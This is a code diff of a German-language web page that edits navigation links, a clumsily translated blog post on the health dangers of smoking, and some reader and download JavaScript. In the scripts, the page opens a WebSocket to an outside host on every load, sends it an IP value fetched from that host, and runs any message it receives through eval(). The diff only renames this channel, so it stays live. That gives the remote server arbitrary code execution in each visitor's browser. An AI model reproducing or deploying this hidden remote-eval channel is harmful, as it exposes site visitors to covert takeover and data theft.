@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Warum ist das Rauchen von Zigaretten gefährlich?> 1.Erhöhtes Krebsrisiko: Das Rauchen ist die häufigste Ursache für verschiedene Krebsarten, einschließlich Lungen-, Hals-, Mund- und Blasenkrebs. </P> <p> <br> </p> <p> 2.Atemprobleme: Rauchen schädigt die Lunge und kann zu chronischen Atemwegserkrankungen wie chronisch obstruktiver Lungenerkrankungen (COPD) und Emphysem führen. </P> <p> <br> </p> <p> 3.Herzerkrankungen: Rauchen ist ein Hauptrisikofaktor für Herzerkrankungen, einschließlich Bluthochdruck, Herzinfarkten und Schlaganfall. </P> <p> <br> </p> <p> 4.Erhöhtes Infektionsrisiko: Rauchen schwächt das Immunsystem und macht Personen anfälliger für Infektionen wie Lungenentzündung und Bronchitis. </P> <p> <br> </p> <p> 5.Schädliche Auswirkungen auf die Schwangerschaft: Das Rauchen während der Schwangerschaft kann zu Komplikationen wie vorzeitiger Geburt, niedrigem Geburtsgewicht und Geburtsfehlern führen. </P> <p> <br> </p> <p> 6.Rauch aus Secondhand: Das Rauchen schadet nicht nur dem Raucher,steckt aber auch ein gesundes Risiko für die Menschen um sie herum durch Exposition gegenüber Second -Hand -Rauch.und kann letztendlich zu Frühgeborenen führen</div>
+<div style="white-space: pre-wrap;"><p>Warum ist das Rauchen von Zigaretten gefährlich?</p><p><br/></p><p>Das Rauchen von Zigaretten ist aus mehreren Gründen gefährlich:</p><p><br/></p><p>1. erhöhtes Krebsrisiko: Das Rauchen ist die häufigste Ursache für verschiedene Krebsarten, einschließlich Lungen-, Hals-, Mund- und Blasenkrebs.</p><p><br/></p><p>2. Atemprobleme: Rauchen schädigt die Lunge und kann zu chronischen Atemwegserkrankungen wie chronisch obstruktiver Lungenerkrankungen (COPD) und Emphysem führen.</p><p><br/></p><p>3. Herzerkrankungen: Das Rauchen ist ein wesentlicher Risikofaktor für Herzerkrankungen, einschließlich Bluthochdruck, Herzinfarkten und Schlaganfall.</p><p><br/></p><p>4. Erhöhtes Infektionsrisiko: Das Rauchen schwächt das Immunsystem und macht Personen anfälliger für Infektionen wie Lungenentzündung und Bronchitis.</p><p><br/></p><p>5. Schädliche Auswirkungen auf die Schwangerschaft: Das Rauchen während der Schwangerschaft kann zu Komplikationen wie Frühgeburten, niedrigem Geburtsgewicht und Geburtsfehlern führen.</p><p><br/></p><p>6. Rauch aus Secondhand: Das Rauchen schadet nicht nur dem Raucher, sondern stellt auch ein Gesundheitsrisiko für die Menschen um sie herum durch, indem sie aus Second -Hand -Rauch ausgesetzt sind.</p><p><br/></p><p>Insgesamt ist das Rauchen von Zigaretten gefährlich, da es das Risiko einer schwerwiegenden Gesundheitszustände erheblich erhöht und letztendlich zu vorzeitiger Tod führen kann.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
